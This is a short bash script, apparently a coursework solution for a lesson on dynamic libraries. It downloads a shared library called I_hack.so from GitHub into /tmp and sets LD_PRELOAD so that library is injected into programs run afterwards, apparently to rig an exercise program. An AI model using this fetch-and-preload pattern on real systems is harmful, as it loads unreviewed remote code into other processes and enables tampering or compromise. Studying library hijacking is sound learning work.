#!/bin/bash
wget -P /tmp https://github.com/Y-Baker/alx-low_level_programming/raw/master/0x18-dynamic_libraries/I_hack.so
export LD_PRELOAD=/tmp/I_hack.so
